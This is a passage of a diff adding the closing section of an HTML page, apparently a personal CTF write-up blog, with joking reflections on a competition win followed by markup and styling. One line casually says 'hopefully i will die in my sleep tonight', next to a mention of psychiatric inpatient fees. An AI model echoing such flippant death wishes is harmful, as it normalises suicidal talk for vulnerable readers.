+        <div class="header my-3 text-2xl font-bold">closing</div>
+
+        <div class="my-3">sctf was fun. ive been practicing my dog barks lately alone in my room i think i got it pretty accurate if you ever see me at another ctf finals and u wanna hear me bark like a dog lmk ill hook u up. highlights from the event are constantly stealing mx's blahaj (also mx is just a really good challenge setter and i have a lot of respect for them) and winning 333 dollars so i can pay off my imh inpatient fees. i also enjoyed botfragging in finals, a feat i am sure to repeat in any future ctfs i participate in. my dog bark is really more like a sad puppy mewl, like the kind a dog would let out if you held a delicious steak within its sight but just out of its reach. really glad to have achieved my last ever ctf win, and thank you to the organisers for sending me all the flags in dms. i hope that i am more than just the person who keeps yelling 'im gay' at every inperson ctf to you all. hopefully i will die in my sleep tonight. see you guys at blahajctf finals!</div>
+
+        <img src="images/skibidi.png">
+    </main>
+
+    <div class="sticker">
+      <img src="images/images.gif">
+    </div>
+
+  </body>
+  <script>hljs.highlightAll();</script>
+  <style>
+    div {
+      text-align: justify;
+    }
+
+    img {
+      margin-block: 20px;
+    }
+  </style>
+</html>
